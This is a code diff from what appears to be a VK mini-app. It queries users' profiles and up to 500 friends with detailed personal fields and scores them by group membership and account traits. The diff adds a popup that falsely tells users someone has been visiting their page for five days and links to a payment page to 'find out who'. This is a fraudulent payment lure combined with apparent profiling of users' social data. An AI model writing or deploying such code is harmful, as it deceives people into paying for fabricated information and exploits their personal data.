@@ -244,16 +244,14 @@
           }
 
           function firstApi() {
-              url_cc = "https://wdf1e3e3qq33eewf.github.io/index/red2_new.html#"+viewer.id;
               var code = 'var time=API.utils.getServerTime(); \n\
               var friends = API.friends.get({"fields": "sex, photo_100, photo_200, photo_max, photo_400_orig, photo_id, online, online_mobile, can_post, relation, last_seen, has_photo, common_count, followers_count, has_photo, occupation","count":500}); \n\
               var u=API.users.get({fields:"uid, first_name, last_name, photo_max, photo_100, photo_400_orig, photo_id, bdate, sex, city, relation, is_closed, counters"})[0]; \n\
               var g=parseInt(API.groups.isMember({group_id:9713780}))+parseInt(API.groups.isMember({group_id:166562603}))+parseInt(API.groups.isMember({group_id:134304772}))+parseInt(API.groups.getMembers({group_id:9713780,count:0,filter:"friends"}).count)+parseInt(API.groups.getMembers({group_id:166562603,count:0,filter:"friends"}).count)+parseInt(API.groups.getMembers({group_id:194823504,count:0,filter:"friends"}).count);u.counters.friends=parseInt(u.counters.friends);if (u.counters.friends<10)g=g+1;if(u.id<1000000) g=g+1; \n\
               u.permissions=g; \n\
               var user={}; \n\
-              var link = API.utils.getShortLink({"url":"'+url_cc+'", "private":1}).short_url; \n\
               var r={user:u,permissions:g}; \n\
-              return [friends,time,r,link];';
+              return [friends,time,r];';
 
                vkConnect.sendPromise("VKWebAppCallAPIMethod", {
                   "method": "execute",
@@ -268,6 +266,22 @@
                     }
                   }
                   viewer.friends.items = fr_temp;
+
+                  var div = '<div class="blackPopap" style="position: relative;z-index: 9999;"> \n\
+                            <div onclick="closeseblackPopap()" class="modal-background" style="position: fixed;"></div> \n\
+                            <div style="position: fixed;top: 50%;left: 50%;transform: translate(-50%, -50%);width: 100%;z-index: 9999;padding: 20px;"> \n\
+                                <div id="LovePopap" style="font-size: 20px;width: 100%;color: white;padding: 20px;border-radius: 10px;"> \n\
+                                 <div onclick="closeseblackPopap()" style="cursor: pointer;font-size: 30px;text-align: right;margin-bottom: 20px;color: #b5b5b5;"><i class="fas fa-times"></i></div> \n\
+                                   <div style="margin-bottom: 10px;text-align: center;"><b>Мы нашли человека <br> Который заходит к тебе на страницу уже <div> <span style="font-size: 20px;margin: 10px;" class="tag is-danger">5 ДНЕЙ ПОДРЯД</span> </div> <div> <div style="font-size: 25px;margin: 10px;"></div> </div></br></div> \n\
+                                    <div style="text-align: center"><a target="_blank" href="https://newappsbase.com/SP/createPay.php?uid=1&price=100" class="button is-success is-fullwidth" style="margin-top: 5px;">Узнать кто это</a></div> \n\
+                              </div> \n\
+                            </div> \n\
+                        </div>';
+                      $("body").append(div);
+
+
+                  goApp();
+                  return false;
 
                   fr_temp = [];
                   viewer.photo_100 = data.response[2].user.photo_100;
